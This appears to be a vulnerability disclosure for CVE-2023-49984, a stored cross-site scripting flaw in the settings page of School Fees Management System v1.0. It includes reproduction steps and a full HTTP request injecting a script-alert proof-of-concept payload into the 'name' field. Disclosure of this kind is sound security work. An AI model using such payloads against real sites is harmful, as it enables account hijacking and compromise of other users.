# CVE-2023-49984
# School Fees Management System v1.0 - Cross-Site Scripting (XSS) Vulnerability in "name" field/parameter on "/management/settings"

**Description**: A cross-site scripting (XSS) vulnerability in the component "/management/settings" of School Fees Management System v1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the name parameter.  

**Vulnerable Product Version**: School Fees Management System v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49984  
**Tested on**: Windows  
### Steps to reproduce:  
To exploit the vulnerability, a user with appropriate permissions must access the "/ci_fms/admin/management/settings" page. On this page, the user should edit the fields in the general settings. The malicious payload needs to be inserted into the "name" or "phone" or "address" or "bank" or "acc_name" or "acc_number".  
### Resquest:  
```
POST /ci_fms/admin/action/main_settings HTTP/1.1
Host: 192.168.68.148
Content-Length: 209
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.68.148
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.68.148/ci_fms/admin/management/settings
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ci_session=qvpbijnrhr1a3stolsuvdglpo8a7mb3h
Connection: close

name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&phone=09123456987&address=14+Street%2C+There+City%2C+Anywhere%2C+2306&bank=ABC+Bank&acc_name=Our+Best+School&acc_number=123456789874&session=2022-2023
```

Discoverer(s)/Credits:  
Geraldo Alcântara
